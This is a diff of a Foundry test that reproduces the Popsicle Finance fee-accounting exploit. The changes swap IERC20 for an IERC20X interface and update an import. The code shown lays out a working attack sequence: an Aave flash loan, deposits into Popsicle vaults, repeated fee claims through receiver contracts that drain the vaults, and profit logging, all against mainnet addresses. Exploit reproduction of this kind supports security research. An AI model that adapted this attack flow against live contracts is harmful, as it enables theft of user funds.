@@ -2,7 +2,7 @@
 pragma solidity ^0.8.10;
 
 import "forge-std/Test.sol";
-import "./OpenZeppelinLibs/SafeERC20.sol";
+import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
 
 interface IUniswapV2Router {
     function WETH() external view returns (address);
@@ -313,14 +313,19 @@ interface IAaveFlashloan {
         uint16 referralCode
     ) external;
 }
+
+interface IERC20X is IERC20 {
+    function decimals() external view returns (uint8);
+    function name() external view returns (string memory);
+}
 // Simple contract which transfers tokens to an address
 
 contract TokenVault {
-    using SafeERC20 for IERC20;
+    using SafeERC20 for IERC20X;
 
     function transfer(address _asset, address _to) external {
-        uint256 bal = IERC20(_asset).balanceOf(address(this));
-        if (bal > 0) IERC20(_asset).safeTransfer(_to, bal);
+        uint256 bal = IERC20X(_asset).balanceOf(address(this));
+        if (bal > 0) IERC20X(_asset).safeTransfer(_to, bal);
         else console.log("no bal");
     }
 
@@ -344,7 +349,7 @@ contract TokenVault {
 // Hacking God : https://twitter.com/BlockSecTeam/status/1422786223156776968
 
 contract PopsicleExp is Test {
-    using SafeERC20 for IERC20;
+    using SafeERC20 for IERC20X;
 
     IAaveFlashloan aaveV2 = IAaveFlashloan(0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9);
 
@@ -373,12 +378,12 @@ contract PopsicleExp is Test {
     uint256[] amountsArr;
     uint256[] modesArr;
 
-    IERC20 usdt = IERC20(_usdt);
-    IERC20 weth = IERC20(_weth);
-    IERC20 wbtc = IERC20(_wbtc);
-    IERC20 usdc = IERC20(_usdc);
-    IERC20 dai = IERC20(_dai);
-    IERC20 uni = IERC20(_uni);
+    IERC20X usdt = IERC20X(_usdt);
+    IERC20X weth = IERC20X(_weth);
+    IERC20X wbtc = IERC20X(_wbtc);
+    IERC20X usdc = IERC20X(_usdc);
+    IERC20X dai = IERC20X(_dai);
+    IERC20X uni = IERC20X(_uni);
 
     IUniswapV2Router router = IUniswapV2Router(payable(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D));
 
@@ -409,7 +414,7 @@ contract PopsicleExp is Test {
     }
 
     function approveToTarget(address asset, address _target) internal {
-        IERC20(asset).forceApprove(_target, type(uint256).max);
+        IERC20X(asset).forceApprove(_target, type(uint256).max);
     }
 
     function _logBalances(string memory message) internal {
@@ -425,7 +430,7 @@ contract PopsicleExp is Test {
     }
 
     function _logTokenBal(address asset) internal view returns (uint256) {
-        return IERC20(asset).balanceOf(address(this));
+        return IERC20X(asset).balanceOf(address(this));
     }
 
     function approveFunds() internal {
@@ -479,8 +484,10 @@ contract PopsicleExp is Test {
                     block.timestamp
                 );
             } else {
-                emit log_named_decimal_uint("Profit ", (bal - (amounts[i] + premiums[i])), IERC20(assets[i]).decimals());
-                console.log(" for asset ", IERC20(assets[i]).name());
+                emit log_named_decimal_uint(
+                    "Profit ", (bal - (amounts[i] + premiums[i])), IERC20X(assets[i]).decimals()
+                );
+                console.log(" for asset ", IERC20X(assets[i]).name());
             }
         }
         return true;
@@ -492,10 +499,10 @@ contract PopsicleExp is Test {
         for (uint256 i = 0; i < vaultsArr.length; i++) {
             //Approve funds for vault
             IPopsicle vault = IPopsicle(vaultsArr[i]);
-            IERC20(vault.token0()).forceApprove(vaultsArr[i], type(uint256).max);
-            IERC20(vault.token1()).forceApprove(vaultsArr[i], type(uint256).max);
+            IERC20X(vault.token0()).forceApprove(vaultsArr[i], type(uint256).max);
+            IERC20X(vault.token1()).forceApprove(vaultsArr[i], type(uint256).max);
             vault.deposit(
-                IERC20(vault.token0()).balanceOf(address(this)), IERC20(vault.token1()).balanceOf(address(this))
+                IERC20X(vault.token0()).balanceOf(address(this)), IERC20X(vault.token1()).balanceOf(address(this))
             );
             drainVault(vaultsArr[i]);
         }
@@ -535,8 +542,8 @@ contract PopsicleExp is Test {
         );
         console.log("claimed recievcer1 fees success");
         (uint256 token0feesr2, uint256 token1feesr2) = (
-            IERC20(address(IPopsicle(_vault).token0())).balanceOf(_vault),
-            IERC20(address(IPopsicle(_vault).token1())).balanceOf(_vault)
+            IERC20X(address(IPopsicle(_vault).token0())).balanceOf(_vault),
+            IERC20X(address(IPopsicle(_vault).token1())).balanceOf(_vault)
         );
 
         receiver2.executeCall(
@@ -551,7 +558,7 @@ contract PopsicleExp is Test {
 
     function transferAround(address _vault) internal {
         console.log("entered transferaround");
-        IERC20 asset = IERC20(_vault);
+        IERC20X asset = IERC20X(_vault);
         uint256 bal = asset.balanceOf(address(this));
         IPopsicle(_vault).collectFees(0, 0);
         asset.transfer(address(receiver1), bal);
